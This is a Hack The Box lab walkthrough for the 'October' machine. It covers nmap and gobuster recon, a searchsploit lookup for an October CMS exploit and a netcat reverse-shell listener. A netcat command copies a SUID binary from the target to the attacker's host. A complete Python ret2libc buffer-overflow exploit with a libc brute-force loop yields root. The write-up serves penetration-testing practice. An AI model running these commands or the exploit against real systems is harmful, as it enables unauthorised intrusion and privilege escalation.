# October Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA october 10.10.10.16 -T4``

![image](https://user-images.githubusercontent.com/123066149/228842989-9c33449e-596b-4a3e-89db-d4963ed5ca07.png)

``sleep 200; nmap -p- -sV -T4 -oA fulloctober 10.10.10.16``

![image](https://user-images.githubusercontent.com/123066149/228843209-b6fbd08e-23f9-456e-b4f0-95e8ead1bd12.png)

``gobuster dir -u http://10.10.10.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt``

![image](https://user-images.githubusercontent.com/123066149/228845053-f2490276-2876-46b8-8247-a570d05fd902.png)

# ${{\color{purple}Initial Foothold}}\ $

![image](https://user-images.githubusercontent.com/123066149/228845266-0904b020-a36c-4e3c-87ee-0fc0bade3191.png)

![image](https://user-images.githubusercontent.com/123066149/228845324-aaa12122-0842-4bde-934c-be5c4f271f22.png)

``searchsploit october CMS``

![image](https://user-images.githubusercontent.com/123066149/228845514-7d1c136d-d33f-498b-88f5-b899f22b2e42.png)

``searchsploit -x php/remote/47376.rb | grep URL``

![image](https://user-images.githubusercontent.com/123066149/228846440-2c797231-441d-41dd-9eff-33fbd0c232bb.png)

![image](https://user-images.githubusercontent.com/123066149/228846964-01f906b4-012b-4b15-93f2-163d87fbbca8.png)

![image](https://user-images.githubusercontent.com/123066149/228847236-78e4ba05-4dae-4a31-a2ff-5221fb294127.png)

# ${{\color{purple}Exploitation}}\ $

![image](https://user-images.githubusercontent.com/123066149/228847588-dec9ee25-1d81-47f3-8850-23dcf10552ec.png)

``nc -nlvp 1234``

![image](https://user-images.githubusercontent.com/123066149/228847746-c2c5a1ef-1756-4ded-a5b2-c4cd953cd5c1.png)

# ${{\color{purple}Privilege Escalation}}\ $

https://ravi5hanka.medium.com/privilege-escalation-in-linux-via-a-local-buffer-overflow-dcee4f9b4a49

``find / -perm -4000 2>/dev/null``

![image](https://user-images.githubusercontent.com/123066149/228848043-e31e5e3a-e793-4f11-8e72-3cd151bb67ff.png)

### Transfert file from client to kali

``nc -w 5 10.10.14.3 999 < /usr/local/bin/ovrflw``

``nc -l -p 999 > ovrfl``

![image](https://user-images.githubusercontent.com/123066149/228850260-f2eabad3-353c-4757-83b9-52b18d1d9a92.png)

### Check integrity:

``md5sum ovflw ``

![image](https://user-images.githubusercontent.com/123066149/228850724-35bd36f6-0ddd-4f8c-8bb7-30472dc50f50.png)

### Check kernel version:

``uname -a ``

![image](https://user-images.githubusercontent.com/123066149/228850943-6b897819-d22e-4c2c-a667-90a9f193c75a.png)

``cat /etc/lsb-release``

![image](https://user-images.githubusercontent.com/123066149/228850983-e5219221-7604-4f83-ac42-eeb87c148b9a.png)

![image](https://user-images.githubusercontent.com/123066149/228851291-86389ba2-23d9-4982-93f9-9bc4544c026f.png)

``/usr/local/bin/ovrflw``

![image](https://user-images.githubusercontent.com/123066149/228851397-4db84aab-b7d8-438c-b94f-75d7ab251710.png)

``gdb ovrfl``

``disas main``

![image](https://user-images.githubusercontent.com/123066149/228851968-26270622-8120-446d-846e-23d5ad02dbd0.png)

``msf-pattern_create -l 300``

![image](https://user-images.githubusercontent.com/123066149/228852426-077a99ae-7fac-4fad-956c-e9aced1953c4.png)

![image](https://user-images.githubusercontent.com/123066149/228852654-a2249290-a840-4a6f-b924-265731a8b713.png)

![image](https://user-images.githubusercontent.com/123066149/228948787-fdb9da19-c7d3-4e21-9a6a-3fce64a43c4e.png)

![image](https://user-images.githubusercontent.com/123066149/228948867-48228b79-0142-4535-90d6-2d3629a51438.png)

### Get system address

``p system``

### Check ASLR

``ldd /usr/local/bin/ovrflw | grep libc`` 


![image](https://user-images.githubusercontent.com/123066149/228949233-724b39da-cd64-49a7-be5b-31443bf8c213.png)


### Find system address :

``readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system``

![image](https://user-images.githubusercontent.com/123066149/228949395-2beecb7d-3929-44ec-855e-604195002920.png)

### Find exit address :

``readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit``

![image](https://user-images.githubusercontent.com/123066149/228949547-9236cd8b-52e2-43db-847d-37d20999e552.png)

### Find /bin/sh address :

``strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh``

![image](https://user-images.githubusercontent.com/123066149/228949734-9e4e3f38-e4fb-4eb7-a9e4-cb9c3b3a7b94.png)

### The exploit :

![image](https://user-images.githubusercontent.com/123066149/228950185-e462d734-0323-4e7c-ba7a-6949d30c7bd1.png)


#!/usr/bin/python3

from struct import pack
from subprocess import call

offset = 112
junk = b"A"*offset

#ret2libc -> system_addr + exit_addr + bin_sh_addr

base_libc_addr = 0xb7602000

system_addr_off = 0x00040310
exit_addr_off = 0x00033260
bin_sh_addr_off = 0x00162bac

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L",base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr

while True:
        ret = call(["/usr/local/bin/ovrflw", payload])

![image](https://user-images.githubusercontent.com/123066149/228951637-17575ac8-fadd-452c-85f2-dba0fdf82327.png)

        
# ${{\color{purple}Point of Improvement}}\ $

* Make a very good list with ``gobuster``

